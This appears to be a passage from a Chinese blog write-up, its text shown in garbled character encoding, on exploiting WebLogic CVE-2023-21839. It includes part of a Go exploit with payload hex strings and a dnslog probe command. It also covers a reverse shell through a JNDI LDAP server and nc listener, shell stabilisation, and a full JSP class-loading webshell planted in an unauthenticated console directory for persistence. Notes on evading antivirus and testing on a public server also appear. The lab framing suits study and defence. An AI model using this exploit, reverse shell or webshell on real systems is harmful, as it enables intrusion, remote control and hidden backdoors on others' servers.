<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ver == <span class="string">&quot;12&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 12&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657200000000000000003349&quot;</span> +</span><br><span class="line">			<span class="string">&quot;444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6e74657874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;000000014245412c0000001000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ver == <span class="string">&quot;14&quot;</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[*] weblogic 14&quot;</span>)</span><br><span class="line">		wlsKey1 = <span class="string">&quot;00424541080103000000000c41646&quot;</span> +</span><br><span class="line">			<span class="string">&quot;d696e53657276657200000000000000003349444c3a7765626c&quot;</span> +</span><br><span class="line">			<span class="string">&quot;6f6769632f636f7262612f636f732f6e616d696e672f4e616d6&quot;</span> +</span><br><span class="line">			<span class="string">&quot;96e67436f6e74657874416e793a312e30000000000002380000&quot;</span> +</span><br><span class="line">			<span class="string">&quot;00000000014245412e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">		wlsKey2 = <span class="string">&quot;00424541080103000000000c41646d696e53657276657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;200000000000000003349444c3a7765626c6f6769632f636f72&quot;</span> +</span><br><span class="line">			<span class="string">&quot;62612f636f732f6e616d696e672f4e616d696e67436f6e74657&quot;</span> +</span><br><span class="line">			<span class="string">&quot;874416e793a312e30000000000004&#123;&#123;key3&#125;&#125;00000001424541&quot;</span> +</span><br><span class="line">			<span class="string">&quot;2e000000100000000000000000&#123;&#123;key1&#125;&#125;&quot;</span></span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;[!] error and exit&quot;</span>)</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>





<hr>
<p>è¿™ä¸ªgoè„šæœ¬çš„ä½¿ç”¨å¾ˆç®€å•ï¼Œå…ˆåœ¨æ”»å‡»æœº<code>1369</code>ç«¯å£æ‰“å¼€ldap</p>
<p>å…ˆè¿›è¡Œç¼–è¯‘</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">go</span> build main.<span class="keyword">go</span> -<span class="keyword">o</span> web.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæ”»å‡»æœºä¸Šæ‰“å¼€1369ç«¯å£ï¼ŒæŒ‚ä¸Šldap</p>
<p><img src="/post/CVE-Test/image-20230302000014731.png" alt="image-20230302000014731"></p>
<p>æœ€åç®€å•è·‘ä¸ªè®¡ç®—å™¨<code>ï¼ˆæµ‹è¯•æ—¶é—´ï¼š2023/3/1ï¼Œç«ç»’æœªæ£€æµ‹åˆ°ï¼Œä½†æ˜¯å¼¹cmdè¿˜æ˜¯ä¼šè¢«è­¦å‘Šçš„ï¼‰</code></p>
<p><img src="/post/CVE-Test/image-20230302000455096.png" alt="image-20230302000455096"></p>
<p><img src="/post/CVE-Test/image-20230302000412160.png" alt="image-20230302000412160"></p>
<h4 id="å…¬ç½‘æµ‹è¯•"><a href="#å…¬ç½‘æµ‹è¯•" class="headerlink" title="å…¬ç½‘æµ‹è¯•"></a>å…¬ç½‘æµ‹è¯•</h4><p>å¤ªç©·äº†ï¼Œæ²¡æœ‰ç¬¬äºŒå°ç”µè„‘ï¼Œåœ¨<code>aliyun</code>ä¸Šæäº†ä¸ª<code>weblogic</code>ï¼Œçœ‹çœ‹æ˜¯å¦æ£€æµ‹çš„åˆ°å—</p>
<p>è¿™æ˜¯å…¬ç½‘ç¯å¢ƒä¸‹çš„</p>
<p><img src="/post/CVE-Test/image-20230302001529947.png" alt="image-20230302001529947"></p>
<p>ç„¶åä¸€æ ·çš„æµ‹è¯•å¦‚ä¸Šï¼Œä¼šè¢«<code>windows defender</code>æ£€æµ‹åˆ°ï¼Œä½†æ˜¯ä¸ä¼šæ‹¦æˆªï¼Œè¿˜æ˜¯ä¼šä¸€æ ·æ‰§è¡Œå‘½ä»¤</p>
<p>å’Œæœ‹å‹å€Ÿäº†ä¸€ä¸‹æœåŠ¡å™¨æµ‹è¯•ï¼Œç¡®å®æ˜¯å¯ä»¥å®ç°å…¬ç½‘æµ‹è¯•çš„ï¼Œè€Œä¸”<code>windows defender</code>å¹¶æœªæ‹¦æˆª(å…¬ç½‘æµ‹è¯•æ—¶é—´:2023&#x2F;3&#x2F;2)</p>
<p><img src="/post/CVE-Test/image-20230302210930469.png" alt="image-20230302210930469"></p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>ä»å®˜ç½‘ä¸‹è½½<code>Weblogic 12.2.1.3.0</code></p>
<p><code>https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html</code></p>
<p><img src="/post/CVE-Test/image-20230226141556869.png" alt="image-20230226141556869"></p>
<h4 id="é…ç½®javaç¯å¢ƒ"><a href="#é…ç½®javaç¯å¢ƒ" class="headerlink" title="é…ç½®javaç¯å¢ƒ"></a>é…ç½®javaç¯å¢ƒ</h4><p>ä½†æ˜¯éœ€è¦æ³¨æ„ï¼Œç”±äº<code>Weblogic</code>ä¸­çš„<code>maven</code>çš„å­˜åœ¨ï¼Œå…¶è¯†åˆ«<code>jdk</code>æ—¶ï¼Œåªé’ˆå¯¹ç¯å¢ƒå˜é‡å<code>JAVA_HOME</code>çš„è·¯å¾„è¿›è¡Œè¯†åˆ«ï¼Œè€Œå¦‚æœæ˜¯åœ¨<code>PATH</code>ä¸­é…ç½®çš„ï¼Œä¼šæŠ¥é”™æ‰¾ä¸åˆ°<code>java</code>ç¯å¢ƒçš„ä½ç½®</p>
<figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>Cannot determine the Java Home ERROR: Specify the -jreLoc option</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†æ¬¡ç®¡ç†å‘˜æ‰§è¡Œæ—¶å‘ç°å¤±è´¥ï¼ŒæŸ¥çœ‹æŠ¥é”™æ—¥å¿—</p>
<blockquote>
<p>java.lang.NullPointerException: Cannot invoke â€œjava.lang.<strong><code>reflect.Method</code></strong>.invoke(Object, Object[])â€ because â€œcom.sun.<code>xml.bind</code>.v2.runtime.reflect.opt.Injector.defineClassâ€ <strong><code>is null</code></strong>[[</p>
</blockquote>
<p>çŒœæµ‹åº”è¯¥æ˜¯æˆ‘çš„<code>java</code>è‡ªèº«çš„é—®é¢˜</p>
<p>ä»<code>stack</code>ä¸­äº†è§£åˆ°äº†ï¼Œåœ¨<code>java9</code>çš„æ—¶å€™ï¼Œ<code>JAXB</code>ï¼ˆJava Architecture for XML Bindingï¼‰<code>[javaæ˜ å°„ä¸ºxmlçš„è¡¨ç¤ºæ–¹å¼]</code> </p>
<p>åœ¨<code>java9</code>å·²ç»è¢«æ ‡è®°ä¸ºå¼ƒç”¨ï¼Œåœ¨<code>java11</code>çš„æ—¶å€™å·²ç»è¢«åˆ é™¤ï¼Œæ‰€ä»¥éœ€è¦æ¢åˆ°ä½ç‰ˆæœ¬çš„<code>java</code>æˆ–è€…åœ¨ä¾èµ–é¡¹æ·»åŠ <code>xml</code>åº“ï¼Œè®©å…¶é‡æ–°æ˜ å°„</p>
<p><a href="https://javaalmanac.io/jdk/11/apidiff/9/">New APIs in Java 11 - javaalmanac.io</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.messaging.saaj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>saaj-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ã€å»ºè®®ä¸‹è½½jdk8ä½ç‰ˆæœ¬æœ€æ–¹ä¾¿ï¼Œè®°å¾—å†æ¬¡ä¿®æ”¹<code>JAVA_HOME</code>ç¯å¢ƒå˜é‡ã€‘</p>
<blockquote>
<p>æ³¨æ„ï¼Œè¿™ä¸ªå’Œlog4jçš„åŸå› ä¸€æ ·ï¼Œæ˜¯åŠ è½½è¿œç¨‹æ¶æ„ç±»å¯¼è‡´è¿œç¨‹å‘½ä»¤çš„æ‰§è¡Œï¼Œæ‰€ä»¥å¯¹javaæ˜¯å¦å¼€å¯åŠ è½½è¿œç¨‹ç±»ï¼Œä¹Ÿå°±æ˜¯è¦æ³¨æ„å¯¹åº”çš„ç‰ˆæœ¬</p>
<p>ç‰ˆæœ¬ â‰¤ <code>JDK 6u211ã€7u201ã€ 8u191ã€11.0.1</code></p>
</blockquote>
<p>æ‰€ä»¥è¿™é‡Œç›´æ¥ä¸‹è½½JDK-8u171</p>
<p><code>https://www.oracle.com/hk/java/technologies/javase/javase8-archive-downloads.html</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf jdk-8u171-linux-x64.tar.gz -C /usr/local/jdk/</span><br><span class="line"></span><br><span class="line"><span class="comment">#éƒ¨ç½²å¹¶ä¿®æ”¹ç¯å¢ƒå˜é‡</span></span><br><span class="line">sudo vi ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="comment">#åœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ ä¸‹é¢4è¡Œå†…å®¹</span></span><br><span class="line"><span class="comment">#è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdkç›®å½•</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 </span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œå‘½ä»¤ä½¿å¾—ä¸Šé¢çš„ç¯å¢ƒå˜é‡æˆåŠŸ</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>

<h5 id="æŸ¥çœ‹ç‰ˆæœ¬-1"><a href="#æŸ¥çœ‹ç‰ˆæœ¬-1" class="headerlink" title="æŸ¥çœ‹ç‰ˆæœ¬"></a>æŸ¥çœ‹ç‰ˆæœ¬</h5><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/2.png" alt="2"></p>
<h3 id="å®‰è£…weblogic"><a href="#å®‰è£…weblogic" class="headerlink" title="å®‰è£…weblogic"></a>å®‰è£…<code>weblogic</code></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar </span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/1.png" alt="1"></p>
<p>å®‰è£…ç›®å½•åå’Œweblogicæ‰€åœ¨ç”¨æˆ·ç»„é»˜è®¤</p>
<p><img src="/post/CVE-Test/4.png" alt="4"></p>
<p> å®‰è£…ä¸­</p>
<p><img src="/post/CVE-Test/5.png" alt="5"></p>
<p><img src="/post/CVE-Test/6.png" alt="6"></p>
<p>ç”¨æˆ·åé»˜è®¤weblogic</p>
<p>å¯†ç ä¸º123456789</p>
<p><img src="/post/CVE-Test/7.png" alt="7"></p>
<p><img src="/post/CVE-Test/8.png" alt="8"></p>
<h3 id="å®‰è£…å®Œæˆåï¼Œå¯åŠ¨æœåŠ¡"><a href="#å®‰è£…å®Œæˆåï¼Œå¯åŠ¨æœåŠ¡" class="headerlink" title="å®‰è£…å®Œæˆåï¼Œå¯åŠ¨æœåŠ¡"></a>å®‰è£…å®Œæˆåï¼Œå¯åŠ¨æœåŠ¡</h3><p>æ‰¾åˆ°<code>/bin</code>å¯åŠ¨æœåŠ¡è„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -name <span class="string">&#x27;startWebLogic.sh&#x27;</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231130123224439.png" alt="image-20231130123224439"></p>
<p>æ‰§è¡Œè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash /home/ttoc/Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/startWebLogic.sh </span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231130123350919.png" alt="image-20231130123350919"></p>
<p>æˆåŠŸè®¿é—®</p>
<p><img src="/post/CVE-Test/image-20231130123511391.png" alt="image-20231130123511391"></p>
<h3 id="æ¼æ´å­˜åœ¨æ€§æµ‹è¯•"><a href="#æ¼æ´å­˜åœ¨æ€§æµ‹è¯•" class="headerlink" title="æ¼æ´å­˜åœ¨æ€§æµ‹è¯•"></a>æ¼æ´å­˜åœ¨æ€§æµ‹è¯•</h3><p>é’ˆå¯¹è¿™ç§ T3 åŠ IIOPå‡ºç°çš„æ¼æ´ï¼Œå’Œlog4j2ä¸€æ ·ï¼Œé‡‡ç”¨dnslogæµ‹è¯•</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">.\CVE-<span class="number">2023</span>-<span class="number">21839</span>.exe -<span class="built_in">ip</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">169</span>.<span class="number">157</span> -port <span class="number">7001</span> -ldap ldap:<span class="comment">//nuu4hz.dnslog.cn</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/dnslog%E6%B5%8B%E8%AF%95.png" alt="dnslogæµ‹è¯•"></p>
<p>å‘ç°æœ‰è¯·æ±‚ï¼Œè¯´æ˜å¯èƒ½å­˜åœ¨æ¼æ´</p>
<p><img src="/post/CVE-Test/dnslog.png" alt="dnslog"></p>
<h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><blockquote>
<p>é¶æœºubuntu20.04ï¼š192.168.169.157</p>
<p>æ”»å‡»æœºkali 2023.2ï¼š192.168.169.130</p>
</blockquote>
<p>æ”»å‡»æœºå¼€å¯ç›‘å¬ï¼Œå‡†å¤‡åå¼¹shell</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvp <span class="number">8888</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231130225927419.png" alt="image-20231130225927419"></p>
<p>ç„¶åä½¿ç”¨JNDIExploit-1.3-SNAPSHOT.jaræ­å»ºldapæœåŠ¡å™¨</p>
<p><img src="/post/CVE-Test/image-20231130231729924.png" alt="image-20231130231729924"></p>
<p>ç”¨goå·¥å…·å‘é¶æœºweblogicæœåŠ¡å‘é€åå¼¹shellçš„å‘½ä»¤</p>
<p><img src="/post/CVE-Test/image-20231130224424739.png" alt="image-20231130224424739"></p>
<p>ä½†æ˜¯æ‰§è¡Œåä»ç„¶é‡åˆ°ä¸€ç‚¹ç‚¹é—®é¢˜ï¼Œæ”»å‡»æœºçš„JNDIExploit-1.3-SNAPSHOT.jaræŠ¥é”™</p>
<p><img src="/post/CVE-Test/image-20231130223814313.png" alt="image-20231130223814313"></p>
<p>é”™è¯¯<code>java.lang.IllegalAccessError: superclass access check failed</code>é€šå¸¸å‘ç”Ÿåœ¨ä¸€ä¸ªç±»è¯•å›¾è®¿é—®å¦ä¸€ä¸ªç±»ä¸­çš„æŸäº›å…ƒç´ ï¼Œä½†æ˜¯ç”±äºJavaçš„è®¿é—®æ§åˆ¶ï¼Œè¿™ä¸ªæ“ä½œè¢«ç¦æ­¢äº†ã€‚</p>
<p>åœ¨è¿™ç§çš„æƒ…å†µä¸‹ï¼Œ<code>com.feihong.ldap.template.TomcatEchoTemplate</code>ç±»è¯•å›¾è®¿é—®<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>ç±»ï¼Œä½†æ˜¯ç”±äºæ¨¡å—<code>java.xml</code>å¹¶æ²¡æœ‰å°†<code>com.sun.org.apache.xalan.internal.xsltc.runtime</code>å¯¼å‡ºç»™<code>com.feihong.ldap.template.TomcatEchoTemplate</code>æ‰€åœ¨çš„æ¨¡å—ï¼Œæ‰€ä»¥è®¿é—®å¤±è´¥äº†ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜å¯èƒ½æ˜¯ç”±äºJavaçš„æ¨¡å—åŒ–ç³»ç»Ÿå¼•å…¥çš„ã€‚</p>
<p>ä»Java 9å¼€å§‹ï¼ŒJavaå¼•å…¥äº†æ¨¡å—ç³»ç»Ÿï¼Œå…è®¸å°†ç±»å’Œæ¥å£ç»„ç»‡åˆ°ä¸åŒçš„æ¨¡å—ä¸­ï¼Œå¹¶ä¸”å¯ä»¥æ§åˆ¶æ¨¡å—ä¹‹é—´çš„è®¿é—®ã€‚</p>
<p>è§£å†³è¿™ä¸ªé—®é¢˜çš„ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨<code>--add-exports</code>é€‰é¡¹æ¥æ‰“å¼€æ¨¡å—çš„è®¿é—®æƒé™ã€‚</p>
<p>æ‰€ä»¥åªç”¨ä¿®æ”¹ä¸€ä¸‹å‘½ä»¤å³å¯å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java --add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED -jar JNDIExploit-1.3-SNAPSHOT.jar -i 192.168.169.130</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‘½ä»¤ä¼šå°†<code>java.xml</code>æ¨¡å—ä¸­çš„<code>com.sun.org.apache.xalan.internal.xsltc.runtime</code>åŒ…å¯¼å‡ºç»™æ‰€æœ‰æœªå‘½åçš„æ¨¡å—ã€‚</p>
<p>å†æ¬¡æ‰§è¡Œï¼ŒæˆåŠŸ</p>
<p><img src="/post/CVE-Test/image-20231130231601753.png" alt="image-20231130231601753"></p>
<p>æŸ¥çœ‹ç›‘å¬ç«¯å£è·å–shellçŠ¶æ€ï¼ŒæˆåŠŸè·å¾—é¶æœºubuntuçš„shell</p>
<p><img src="/post/CVE-Test/image-20231130233109406.png" alt="image-20231130233109406"></p>
<h3 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h3><p>åå¼¹è·å–çš„shellå­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼Œç”±äºæ˜¯é€šè¿‡ncç›‘å¬è·å–çš„ä¸€æ¬¡ä¼šè¯ï¼Œå¦‚æœncè¢«é€€å‡ºï¼Œè·å–çš„shellä¹Ÿä¼šè·Ÿç€ä¸¢å¤±ï¼Œ</p>
<p>æ‰€ä»¥éœ€è¦å°†è·å–çš„shellä»ncç›‘å¬ä¼šè¯ï¼Œè½¬ä¸ºæ­£å¼çš„ä¸€ä¸ªç»ˆç«¯ä¼šè¯ã€‚</p>
<p>å…ˆctrl zè®²ncè·å–çš„shellä¼šè¯ç½®äºåå°è¿è¡Œï¼Œç„¶åæ‰§è¡Œå‘½ä»¤ï¼Œ</p>
<p>å…ˆé‡ç½®sttyï¼Œä¹Ÿå°±æ„å‘³ç€ä½ çœ‹ä¸åˆ°è¾“å…¥çš„å†…å®¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>  </span><br></pre></td></tr></table></figure>

<p>ç„¶åæŠŠåå°æŒ‚èµ·çš„ncè·å–çš„shellä¼šè¯è°ƒå›å‰å°ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fg</span>  </span><br></pre></td></tr></table></figure>

<p>æœ€åå†æ¬¡å®Œå…¨åˆ·æ–°ç»ˆç«¯å±å¹•ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reset  </span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥åˆèµ·æ¥ï¼Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>;<span class="built_in">fg</span>;reset</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231130233218761.png" alt="image-20231130233218761"></p>
<p>ä½†æ˜¯ä¼šå‘ç°è™½ç„¶shellç¨³å®šäº†ï¼Œä½†æ˜¯æ˜¾ç¤ºé”™ä½äº†ï¼Œè¿™æ˜¯sttyçš„åŸå› ï¼Œå½“ç„¶ä¹Ÿæœ‰éƒ¨åˆ†kaliå’Œubuntuä¹‹é—´ç»ˆç«¯æ˜¾ç¤ºåº•å±‚çš„å·®å¼‚å¯¼è‡´ï¼Œå¯ä»¥ç”¨pythonè‡ªå¸¦çš„äº¤äº’å¼shellå¤„ç†ï¼Œä½¿å¾—ä¼šè¯æ˜¾ç¤ºè§„æ•´</p>
<p>ç›´æ¥å¯åŠ¨pythonå¼äº¤äº’</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231130233600459.png" alt="image-20231130233600459"></p>
<p>å¯ä»¥çœ‹åˆ°è°ƒç”¨åæ ¼å¼æ›´è§„æ•´ï¼Œå¹¶ä¸”è¯¥äº¤äº’shellè¿˜ç›´æ¥ä½¿ç”¨å½“å‰ç»ˆç«¯çš„é«˜äº®æ˜¾ç¤ºï¼Œä¹Ÿæ–¹ä¾¿åˆ†æ¸…æ–‡ä»¶ç±»å‹ã€‚</p>
<p>ç”±äºweblogicæœåŠ¡éœ€è¦æ¯”è¾ƒé«˜çš„æƒé™ç”¨æˆ·æ‰§è¡Œå¯åŠ¨ï¼Œæ‰€ä»¥åå¼¹shellè·å–çš„ä¼šè¯æƒé™ä¹Ÿä¼šå¾ˆé«˜ï¼Œæ‰€ä»¥å¦‚æœæ²¡æœ‰å¯¹æ‰§è¡ŒweblogicæœåŠ¡å™¨å¯åŠ¨çš„ç”¨æˆ·è‡ªèº«çš„æƒé™è¿›è¡Œé™åˆ¶ï¼Œå°±ä¼šååˆ†å±é™©ã€‚</p>
<p>ä½†æ˜¯ä¸ºäº†ç»´æŒæƒé™ç¨³å®šï¼Œå¯ä»¥å†™ä¸€ä¸ªjspä¸€å¥è¯æœ¨é©¬ä¸Šå»</p>
<p>æ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼ŒweblogicæœåŠ¡å™¨çš„ç½‘ç«™æ–‡ä»¶ä»¥åŠç›®å½•éƒ½åœ¨è¿™ä¸ªç›®å½•ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/home/ttoc/Oracle/Middleware/Oracle_Home/wlserver/server/lib/consoleapp/webapp</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹è¿™ä¸ªç›®å½•ä¸‹çš„çŠ¶å†µï¼Œ</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ll</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231130235701569.png" alt="image-20231130235701569"></p>
<p>åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªwebç«¯å¯ä»¥éç™»å½•ç›´æ¥è®¿é—®ç›®å½•ä¸‹æ–‡ä»¶çš„ç›®å½•ï¼Œå†™ä¸€ä¸ªä¸æ­»é©¬ï¼Œå³å¯å®ç°åé—¨ç›®çš„ä»¥æ¥ç»´æŒæƒé™ã€‚</p>
<p>æŸ¥çœ‹ç½‘é¡µæºç ï¼Œå‘ç°&#x2F;console&#x2F;csså¯ä»¥åœ¨éç™»å½•çŠ¶æ€ä¸‹è®¿é—®ï¼Œå¹¶ä¸”è¯¥ç›®å½•æ‹¥æœ‰æ‰§è¡Œæƒé™ï¼Œå½“ç„¶å¦‚æœæ²¡æœ‰ä¹Ÿå¯ä»¥å‡­å€Ÿå½“å‰çš„rootèº«ä»½shellæƒé™è¿›è¡Œèµ‹æƒï¼Œ</p>
<p><img src="/post/CVE-Test/image-20231130235335497.png" alt="image-20231130235335497"></p>
<p>ç„¶ååœ¨<code>css</code>ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªjspä¸€å¥è¯æœ¨é©¬æ–‡ä»¶ï¼Œ</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            <span class="built_in">super</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="literal">null</span>);</span><br><span class="line">            <span class="keyword">return</span> (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">cls</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cls != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>å†ç»™<code>1.jsp</code>èµ‹æƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 777 ./1.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20231201110707134.png" alt="image-20231201110707134"></p>
<p>ç„¶åèšå‰‘å°è¯•è¿æ¥é¶æœºçš„è¿™ä¸ªæ–‡ä»¶</p>
<p><img src="/post/CVE-Test/image-20231201000810938.png" alt="image-20231201000810938"></p>
<p>è®¿é—®å‘ç°è¿æ¥æˆåŠŸï¼Œ</p>
